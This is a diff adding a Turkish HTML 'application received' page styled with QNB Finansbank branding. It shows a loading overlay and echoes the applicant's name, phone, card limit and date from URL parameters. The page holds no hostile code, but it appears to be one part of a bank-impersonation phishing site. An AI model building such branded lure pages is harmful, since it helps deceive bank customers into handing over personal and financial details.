@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Başvuru Başarılı | QNB</title>
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">
+    <style>
+        :root {
+            --primary-color: #920874;
+            --primary-hover: #640650;
+            --background-gradient: linear-gradient(135deg, #000f33, #78014f);
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --text-color: #fff;
+            --input-bg: rgba(255, 255, 255, 0.95);
+            --error-color: #ff6b6b;
+            --link-color: #a7c4ff;
+            --active-tab: #ffffff;
+            --inactive-tab: rgba(255, 255, 255, 0.6);
+            --tab-bg: rgba(255, 255, 255, 0.15);
+            --success-color: #4BB543;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--background-gradient);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            line-height: 1.6;
+        }
+
+        /* Loading Stilleri */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--background-gradient);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .success-container {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            padding: 2rem;
+            border-radius: 16px;
+            width: 450px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            text-align: center;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s ease forwards 0.5s;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-header {
+            margin-bottom: 1.5rem;
+        }
+
+        .success-header h1 {
+            font-size: 1.6rem;
+            margin-bottom: 1rem;
+            color: var(--success-color);
+        }
+
+        .success-header p {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 0.5rem;
+            font-size: 0.95rem;
+        }
+
+        .success-card {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 1.2rem;
+            margin-top: 1.2rem;
+            text-align: left;
+        }
+
+        .success-card h3 {
+            font-size: 1.1rem;
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .success-info-row {
+            display: flex;
+            margin-bottom: 0.8rem;
+            font-size: 0.9rem;
+        }
+
+        .success-info-label {
+            width: 100px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .success-info-value {
+            flex: 1;
+            color: white;
+            font-weight: 500;
+        }
+
+        .success-home-button {
+            display: inline-block;
+            width: 100%;
+            padding: 0.8rem;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-top: 1.2rem;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(146, 8, 116, 0.3);
+        }
+
+        .success-home-button:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(146, 8, 116, 0.4);
+        }
+
+        .success-home-button:active {
+            transform: translateY(0);
+            box-shadow: 0 3px 8px rgba(146, 8, 116, 0.3);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 1.2rem;
+            width: 100%;
+            max-width: 450px;
+            opacity: 0.8;
+        }
+
+        .footer a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer p {
+            margin-bottom: 0.5rem;
+        }
+
+        .mobile-header {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .mobile-kusak {
+            width: 225px;
+            height: auto;
+        }
+
+        .mobile-logo {
+            position: absolute;
+            top: 30px;
+            left: 25px;
+            width: 150px;
+        }
+
+        @media (max-width: 768px) {
+            .mobile-header {
+                display: block;
+                z-index: 0;
+            }
+
+            .success-container {
+                width: 85%;
+                margin-top: 100px;
+                padding: 1.5rem;
+            }
+            
+            .success-header h1 {
+                font-size: 1.4rem;
+            }
+            
+            .success-info-row {
+                flex-direction: column;
+            }
+            
+            .success-info-label {
+                width: 100%;
+                margin-bottom: 0.2rem;
+            }
+        }
+
+        .checkmark {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 1.2rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .checkmark-circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: var(--success-color);
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        
+        .checkmark-check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            stroke: var(--success-color);
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+        
+        @keyframes stroke {
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <img src="assets/img/QNB_Loading_Icon.gif" alt="loading...">
+        <div class="loading-text">QNB Finansbank'a Hoş Geldiniz<br>Yükleniyor...</div>
+    </div>
+
+    <div class="mobile-header">
+        <img src="assets/img/mobil-kusak.png" alt="Mobil Kuşak" class="mobile-kusak">
+        <img src="assets/img/logo.png" alt="Logo" class="mobile-logo">
+    </div>
+
+    <div class="success-container">
+        <div class="checkmark">
+            <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
+                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+        </div>
+        
+        <div class="success-header">
+            <h1>Tebrikler! Başvurunuz Başarıyla Alındı</h1>
+            <p>Başvuru işleminiz sistemimize kaydedilmiştir.</p>
+            <p>Müşteri temsilcilerimiz 1-3 iş günü içerisinde sizinle iletişime geçecektir.</p>
+        </div>
+        
+        <div class="success-card">
+            <h3>Başvuru Bilgileriniz</h3>
+            <div class="success-info-row">
+                <div class="success-info-label">Ad:</div>
+                <div class="success-info-value"><span id="adi"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Soyad:</div>
+                <div class="success-info-value"><span id="soyadi"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Telefon:</div>
+                <div class="success-info-value"><span id="telefon"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Kart Limiti:</div>
+                <div class="success-info-value"><span id="limit"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Başvuru Tarihi:</div>
+                <div class="success-info-value"><span id="islemSaati"></span></div>
+            </div>
+            
+            <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p><strong>QNB Gizlilik Politikası</strong> | <strong>Kullanım Şartları</strong></p>
+        <p>Uyarı<br>
+            © 2025 QNB v4.1.23</p>
+    </div>
+
+    <script>
+        // Sayfa yüklendiğinde loading ekranını gizle
+        window.addEventListener('load', function () {
+            setTimeout(function () {
+                const loadingOverlay = document.getElementById('loading-overlay');
+                loadingOverlay.style.opacity = '0';
+                setTimeout(function () {
+                    loadingOverlay.style.display = 'none';
+                }, 500);
+            }, 1500);
+        });
+
+        // URL'den parametreleri al ve HTML'e yazdır
+        document.addEventListener("DOMContentLoaded", function() {
+            const params = new URLSearchParams(window.location.search);
+            
+            // Format phone number if exists
+            let phone = params.get("phone") || "Bilinmiyor";
+            if (phone && phone !== "Bilinmiyor") {
+                phone = phone.replace(/(\+90)(\d{3})(\d{3})(\d{2})(\d{2})/, "$1 $2 $3 $4 $5");
+            }
+            
+            // Format limit if exists
+            let limit = params.get("limit") || "Bilinmiyor";
+            if (limit && limit !== "Bilinmiyor") {
+                limit = new Intl.NumberFormat('tr-TR').format(parseInt(limit.replace(/\D/g, '')));
+                limit += " ₺";
+            }
+            
+            // Format date if exists
+            let islemSaati = params.get("islemSaati") || new Date().toLocaleString('tr-TR');
+            
+            document.getElementById("adi").textContent = params.get("adi") || "Bilinmiyor";
+            document.getElementById("soyadi").textContent = params.get("soyadi") || "Bilinmiyor";
+            document.getElementById("telefon").textContent = phone;
+            document.getElementById("limit").textContent = limit;
+            document.getElementById("islemSaati").textContent = islemSaati;
+        });
+    </script>
+</body>
+
+</html>
